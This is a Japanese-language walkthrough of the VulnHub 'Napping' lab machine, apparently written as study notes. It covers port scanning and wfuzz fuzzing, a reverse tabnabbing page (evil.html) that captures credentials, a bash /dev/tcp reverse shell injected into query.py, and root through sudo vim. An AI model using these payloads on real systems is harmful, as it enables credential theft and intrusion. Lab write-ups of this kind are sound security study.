1.Nappingのアドレス特定
```bash
sudo netenum 192.168.56.0/24 5 1
```
- 5:タイムアウト地
- 1:冗長モード０～３を指定可能。１以上を出力すると端末数を出力する

2.IPアドレスを環境変数に設定する
```bash
export IP=192.168.56.107
```
3.ポートスキャンする
```bash
sudo hping3 -8 1-1024 -S $IP
```
- -8 : スキャンモード
- -S : SYNパケットを送信

| TARGET IP | PORT |
|-----|-----|
| 192.168.56.107 | 22,80 |

4.HTTPアクセスする
```
http://192.168.56.107/
```
- 新しいユーザーとパスワードを作成できるので作成してログイン
5.開発者ツールで挙動をもう少し見てみる
  - FireFoxの場合　：　F12
6.HTTPリクエストに対して※ファジングする
　**※ファジングとは　⇒　通常想定されていないデータをシステムに与えて潜在的な脆弱性を検出するテスト手法**
- まずはファイルをさがす
```bash
head -n 5 /home/user/vulnhub/SList/Discovery/Web-Content/raft-large-files.txt
wc -w /home/user/vulnhub/SList/Discovery/Web-Content/raft-large-files.txt
wfuzz -c -z file,/home/user/vulnhub/SList/Discovery/Web-Content/raft-large-files.txt --hc 404 "$IP/FUZZ"
```
**-c : カラー出力　-z file : 辞書ファイルを指定　--hc 404 : 404の応答を表示しない**

- ディレクトリ探索
```bash
head -n 5 /home/user/vulnhub/SList/Discovery/Web-Content/raft-large-directories.txt
wc -w /home/user/vulnhub/SList/Discovery/Web-Content/raft-large-directories.txt
wfuzz -c -z file,/home/user/vulnhub/SList/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$IP/FUZZ"
```
**特定の脆弱性は見つからず**

7.実験用のディレクトリを作成
```bash
mkdir /home/user/vulnhub/napping
```
8.タブナビング攻撃を実行する罠ページを準備する
- ログインページで右クリック＞Save page As＞nappingディレクトリへ保存
- 既存ページとそっくりの罠ページを作成
  ```bash
  cp Login.html get_info.html
  ```
- evil.html作成（親Windowsのlocationプロパティを罠ページに変更）
  **vi evil.html**
  ```bash
  <!DOCTYPE html>
  <html>
  <body>
  <script>
  if(window.opener){
  window.opener.location = "http://192.168.56.101:31337/get_info.html";
  }
  </script>
  </body>
  </html>
  ```
9.タブナビング攻撃の罠ページを設置したHTTPサービスを用意する
```bash
sudo tail -f -n 10 /var/log/apache2/access.log
sudo python3 -m http.server 80
nc -lvnp 31337
```
**準備完了**
10.タブナビング攻撃　開始
- シナリオ
  
  a. ユーザーがログインし、登録されたURL（evil）でsubmitする<br>
  b. ページに到達したときにncとpyhton3に引っかかる<br>
  c. Netcat側にユーザーとパスワードが表示される<br>
   - username=daniel&password=C%40ughtm3napping123
     **※C@ughtm3napping123**

11.認証情報をSSHに使う
```bash
ssh daniel@$IP
```
*<以下、daniel>*
12.現状を把握する
```bash
cat /etc/passwd | grep daniel
id
sudo -l
```
- sudo -l : sudo権限の確認
13.config.phpファイルの中身を確かめる
```bash
cat /var/www/html/config.php
```
```
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'P@sswr0d456');
define('DB_NAME', 'website');
```
14.データベースにアクセスする
```bash
mysql -u adrian -p
```
```
＞show databases;　←データベースを探して
＞use website;　   ←見つけたデータベースを使って
＞show tables;   　←そのデータベースのテーブルを表示
```
**usersテーブルを発見したのでそれを調べる**

```
>select * from users\G
```
- \Gは縦に表示させる
15.実行可能なファイルを検索
**danielはAdministratorsグループに属していた**
```bash
find / -group administrator 2> /dev/null
```
16.リバースシェルの準備
- /dev/shm下にrevshell.shを作榮
  ```bash
  /bin/bash
  bash -c 'bash -i >& /dev/tcp/192.168.56.101/4242 0>&1'
  ```
- 実行権限を与える
  ```bash
  chmod +x revshell.sh
  ```
- adrianのbashパスを確認
  ```bash
  which bash
  ```
- query.pyに追記
  ```bash
  import os
  os.system('/usr/bin/bash /dev/shm/revshell.sh')
  ```
  **今回は４行目くらいに追記（上記２行目）**
  
17.リバースシェルのセッションを確立
  - セッションの確立を確認
    - Netcatにプロンプトが表示された
    - adrianユーザーのシェルを奪取　`adrian@napping:~$ `
    - リバースシェルが機能しないときがある⇒作ったファイルが存在してるか確認
*<以下,adrian>*
18.完全な対話的シェルを奪取する
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
^z(Ctrl+Z)　              ←バックグラウンドに戻す
stty raw -echo;fg　       ←入力したコマンドを出力せずにフォアグラウンドに戻す
adrian$export TERM=xterm　←タブ補完機能が使えるようになる
```
19.ルートシェルを奪取する
```bash
sudo -l
```
```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```
`#`になる

20.対話的シェルに切り替える
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
`#` ⇒ `root@napping:/home/adrian#` ←　なじみのあるプロンプトになる
